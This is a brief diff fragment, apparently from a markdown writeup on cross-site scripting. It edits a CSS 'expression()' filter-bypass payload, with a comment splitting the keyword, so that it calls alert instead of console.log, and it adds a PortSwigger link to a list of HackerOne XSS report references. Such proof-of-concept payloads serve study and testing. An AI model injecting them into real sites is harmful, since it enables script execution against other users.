-hello:expr/**/ession(console.log(null))
+hello:expr/**/ession(alert(null))
 ```
 
 ---
 
 References
 
+- [Cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)
 - [CWE-79](https://hackerone.com/hacktivity/cwe_discovery?id=cwe-79)
 - [The return of the ＜](https://hackerone.com/reports/639684)
 - [Stored XSS in Wiki pages](https://hackerone.com/reports/526325)
